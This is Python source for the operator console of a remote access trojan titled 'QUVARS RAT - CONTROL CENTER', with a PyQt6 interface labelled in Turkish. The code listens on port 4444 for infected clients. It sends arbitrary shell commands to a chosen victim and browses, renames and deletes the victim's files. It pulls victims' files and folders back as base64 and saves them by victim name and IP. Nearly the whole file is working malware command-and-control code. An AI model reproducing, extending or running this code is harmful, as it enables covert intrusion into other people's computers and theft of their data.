import socket
import threading
import sys
import os
import base64
from PyQt6.QtWidgets import *
from PyQt6.QtCore import pyqtSignal, QObject, Qt
from PyQt6.QtGui import QAction, QCursor

class Comm(QObject):
    client_connected = pyqtSignal(str, str, object)
    data_received = pyqtSignal(str)

class TerminalModule(QWidget):
    def __init__(self, send_callback):
        super().__init__()
        self.send_callback = send_callback
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background-color: #121212; color: #B0B0B0; border: none; padding: 30px; font-family: 'Consolas'; font-size: 13px;")
        self.input = QLineEdit()
        self.input.setFixedHeight(60)
        self.input.setPlaceholderText("Type command...")
        self.input.setStyleSheet("background: #181818; border: none; border-top: 1px solid #252525; color: #FFF; padding-left: 25px;")
        self.input.returnPressed.connect(self.handle_send)
        layout.addWidget(self.output)
        layout.addWidget(self.input)

    def handle_send(self):
        cmd = self.input.text().strip()
        if cmd:
            self.output.append(f"<span style='color: #555;'>❯</span> <b>{cmd}</b>")
            self.send_callback(cmd)
            self.input.clear()

class FileManagerModule(QWidget):
    def __init__(self, send_callback):
        super().__init__()
        self.send_callback = send_callback
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 20, 30, 30)
        
        top_bar = QHBoxLayout()
        self.back_btn = QPushButton(" ⮌ GERİ ")
        self.back_btn.setFixedWidth(100)
        self.back_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.back_btn.setStyleSheet("background: #252525; color: #EEE; font-weight: bold; border-radius: 4px; padding: 8px;")
        self.back_btn.clicked.connect(self.go_back)
        
        self.path_lbl = QLabel("Dizin: ...")
        self.path_lbl.setStyleSheet("color: #00FF00; font-family: 'Consolas'; font-weight: bold; margin-left: 15px; background: #181818; padding: 5px; border-radius: 3px; border: 1px solid #252525;")
        
        top_bar.addWidget(self.back_btn)
        top_bar.addWidget(self.path_lbl)
        top_bar.addStretch()
        layout.addLayout(top_bar)

        self.table = QTableWidget(0, 1)
        self.table.setHorizontalHeaderLabels(["İsim"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.show_context_menu)
        self.table.itemDoubleClicked.connect(self.on_item_double_clicked)
        self.table.setStyleSheet("QTableWidget { background-color: #181818; color: #EEE; border: 1px solid #252525; } QHeaderView::section { background-color: #252525; color: #888; border: none; padding: 10px; }")
        
        self.refresh_btn = QPushButton("DİZİNİ YENİLE")
        self.refresh_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.refresh_btn.setStyleSheet("QPushButton { background: #FFF; color: #000; font-weight: 900; padding: 12px; border-radius: 4px; margin-top: 10px; }")
        self.refresh_btn.clicked.connect(lambda: self.send_callback("list_dir"))
        
        layout.addWidget(self.table)
        layout.addWidget(self.refresh_btn)

    def show_context_menu(self, pos):
        item = self.table.itemAt(pos)
        if not item: return
        menu = QMenu()
        menu.setStyleSheet("QMenu { background-color: #252525; color: white; border: 1px solid #444; } QMenu::item:selected { background-color: #444; }")
        full_text = item.text()
        name = full_text.split("  ", 1)[1] if "  " in full_text else full_text
        
        # Klasör ise ZIP olarak indir, dosya ise normal indir
        is_folder = "📁" in full_text
        action_download = QAction("⬇ İndir (ZIP)" if is_folder else "⬇ İndir", self)
        action_rename = QAction("✏ Yeniden Adlandır", self)
        action_delete = QAction("🗑 Sil", self)
        
        action_download.triggered.connect(lambda: self.send_callback(f'download "{name}"'))
        action_rename.triggered.connect(lambda: self.rename_item(name))
        action_delete.triggered.connect(lambda: self.delete_item(name))
        
        menu.addAction(action_download)
        menu.addAction(action_rename)
        menu.addAction(action_delete)
        menu.exec(self.table.viewport().mapToGlobal(pos))

    def rename_item(self, old_name):
        new_name, ok = QInputDialog.getText(self, "Yeniden Adlandır", f"{old_name} için yeni isim:")
        if ok and new_name:
            self.send_callback(f'rename "{old_name}" "{new_name}"')
            self.send_callback("list_dir")

    def delete_item(self, name):
        confirm = QMessageBox.question(self, "Sil", f"{name} öğesini silmek istediğinize emin misiniz?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if confirm == QMessageBox.StandardButton.Yes:
            self.send_callback(f'delete "{name}"')
            self.send_callback("list_dir")

    def go_back(self):
        self.send_callback('cd ".."')
        self.send_callback("list_dir")

    def on_item_double_clicked(self, item):
        if "📁" in item.text():
            name = item.text().split("  ", 1)[1]
            self.send_callback(f'cd "{name}"')
            self.send_callback("list_dir")

    def update_table(self, file_data):
        self.table.setRowCount(0)
        parts = file_data.strip().split('\n')
        folders, files = [], []
        for line in parts:
            if line.startswith("PATH:"):
                self.path_lbl.setText(f"Dizin: {line[5:].strip()}")
            elif "|" in line:
                name, _, ftype = line.split('|')
                if ftype.strip() == "Folder": folders.append(name)
                else: files.append(name)
        
        for f in sorted(folders):
            row = self.table.rowCount()
            self.table.insertRow(row); self.table.setItem(row, 0, QTableWidgetItem(f"📁  {f}"))
        for f in sorted(files):
            row = self.table.rowCount()
            self.table.insertRow(row); self.table.setItem(row, 0, QTableWidgetItem(f"📄  {f}"))

class ServerPanel(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("QUVARS RAT - CONTROL CENTER")
        self.setFixedSize(1000, 720)
        self.setStyleSheet("background-color: #121212; color: #E0E0E0;")
        self.clients, self.active_id, self.comm = {}, None, Comm()
        self.main_stack = QStackedWidget()
        self.setCentralWidget(self.main_stack)
        self.init_list_page()
        self.init_control_page()
        self.comm.client_connected.connect(self.add_client)
        self.comm.data_received.connect(self.handle_incoming_data)
        if not os.path.exists("downloads"): os.makedirs("downloads")
        threading.Thread(target=self.start_listener, daemon=True).start()

    def handle_incoming_data(self, data):
        if "PATH:" in data or "FILE_LIST|" in data:
            self.file_mod.update_table(data)
        elif data.startswith("FILE_DATA|"):
            try:
                parts = data.split("|", 2)
                name, b64_data = parts[1], parts[2]
                
                # Cihaz klasörü: downloads/NAME - IP/
                safe_id = self.active_id.replace("@", " - ")
                save_dir = os.path.join("downloads", safe_id)
                if not os.path.exists(save_dir): os.makedirs(save_dir)
                
                full_path = os.path.join(save_dir, name)
                with open(full_path, "wb") as f:
                    f.write(base64.b64decode(b64_data))
                
                self.terminal_mod.output.append(f"<b style='color: #00FF00;'>[✔] İNDİRME TAMAMLANDI:</b><br><span style='color:#888;'>{full_path}</span>")
            except Exception as e:
                self.terminal_mod.output.append(f"<b style='color: #FF0000;'>[✘] İndirme Hatası: {e}</b>")
        else:
            self.terminal_mod.output.append(f"<pre style='color: #D0D0D0;'>{data}</pre>")

    def init_list_page(self):
        page = QWidget(); layout = QVBoxLayout(page); layout.setContentsMargins(60, 60, 60, 60)
        header = QLabel("QUVARS RAT"); header.setStyleSheet("font-size: 36px; font-weight: 900; color: #FFF;")
        layout.addWidget(header); layout.addWidget(QLabel("NETWORK MANAGEMENT CONSOLE")); layout.addSpacing(40)
        scroll = QScrollArea(); scroll.setWidgetResizable(True); scroll.setStyleSheet("border: none; background: transparent;")
        self.card_container = QWidget(); self.card_layout = QGridLayout(self.card_container); self.card_layout.setSpacing(20)
        self.card_layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        self.placeholder = QLabel("BAĞLANTI BEKLENİYOR..."); self.card_layout.addWidget(self.placeholder)
        scroll.setWidget(self.card_container); layout.addWidget(scroll); self.main_stack.addWidget(page)

    def init_control_page(self):
        page = QWidget(); layout = QVBoxLayout(page); layout.setContentsMargins(0,0,0,0); layout.setSpacing(0)
        nav = QFrame(); nav.setFixedHeight(100); nav.setStyleSheet("background: #181818; border-bottom: 1px solid #252525;")
        nav_lay = QVBoxLayout(nav); top = QHBoxLayout()
        back = QPushButton("← OTURUMU KAPAT"); back.clicked.connect(lambda: self.main_stack.setCurrentIndex(0))
        back.setCursor(Qt.CursorShape.PointingHandCursor)
        back.setStyleSheet("color: #555; background: transparent; border: none; font-weight: bold;")
        self.info_lbl = QLabel("OTURUM: YOK"); self.info_lbl.setStyleSheet("color: #FFF; font-weight: bold;")
        top.addWidget(back); top.addStretch(); top.addWidget(self.info_lbl); nav_lay.addLayout(top)
        tab_lay = QHBoxLayout(); self.tabs = QButtonGroup(self)
        btn_s = "QPushButton { background: transparent; color: #555; border: none; padding: 10px 20px; font-weight: 800; } QPushButton:checked { color: #FFF; border-bottom: 2px solid #FFF; }"
        for i, name in enumerate(["TERMİNAL", "DOSYA YÖNETİCİSİ", "EKRAN İZLEME", "GÖREV YÖNETİCİSİ"]):
            btn = QPushButton(name); btn.setCheckable(True); btn.setStyleSheet(btn_s); btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.tabs.addButton(btn, i); tab_lay.addWidget(btn)
        tab_lay.addStretch(); nav_lay.addLayout(tab_lay)
        self.module_stack = QStackedWidget()
        self.terminal_mod = TerminalModule(self.raw_send); self.file_mod = FileManagerModule(self.raw_send)
        self.module_stack.addWidget(self.terminal_mod); self.module_stack.addWidget(self.file_mod)
        self.module_stack.addWidget(QLabel("EKRAN MODÜLÜ")); self.module_stack.addWidget(QLabel("TASK MODÜLÜ"))
        self.tabs.buttonClicked.connect(self.change_tab)
        layout.addWidget(nav); layout.addWidget(self.module_stack); self.main_stack.addWidget(page)

    def change_tab(self, btn):
        idx = self.tabs.id(btn)
        self.module_stack.setCurrentIndex(idx)
        if idx == 1: self.raw_send("list_dir")

    def add_client(self, ip, cid, conn):
        self.placeholder.hide(); fid = f"{cid}@{ip}"; self.clients[fid] = conn
        card = QPushButton(); card.setFixedSize(320, 100); card.setCursor(Qt.CursorShape.PointingHandCursor)
        card.setStyleSheet("QPushButton { background: #1E1E1E; border: 1px solid #2D2D2D; border-radius: 8px; text-align: left; }")
        cl = QVBoxLayout(card); lbl = QLabel(f"<b>{cid.upper()}</b><br><span style='color:#555;'>{ip}</span>")
        lbl.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents)
        cl.addWidget(lbl); card.clicked.connect(lambda: self.open_session(fid))
        row, col = divmod(len(self.clients)-1, 2); self.card_layout.addWidget(card, row, col)

    def open_session(self, fid):
        self.active_id = fid; self.info_lbl.setText(f"AKTİF: {fid}")
        self.main_stack.setCurrentIndex(1); self.tabs.button(0).setChecked(True); self.module_stack.setCurrentIndex(0)
        threading.Thread(target=self.receiver, args=(self.clients[fid], fid), daemon=True).start()

    def raw_send(self, cmd):
        if self.active_id:
            try: self.clients[self.active_id].send(cmd.encode('utf-8'))
            except: pass

    def start_listener(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.bind(('0.0.0.0', 4444)); s.listen(50)
        while True:
            conn, addr = s.accept(); conn.send("AUTH_REQ".encode())
            cid = conn.recv(1024).decode(errors='ignore').strip()
            if cid and "AUTH_REQ" not in cid: self.comm.client_connected.emit(addr[0], cid, conn)

    def receiver(self, conn, fid):
        while True:
            try:
                data = conn.recv(1024*1024).decode('utf-8', errors='ignore')
                if not data: break
                self.comm.data_received.emit(data)
            except: break

if __name__ == "__main__":
    app = QApplication(sys.argv); ex = ServerPanel(); ex.show(); sys.exit(app.exec())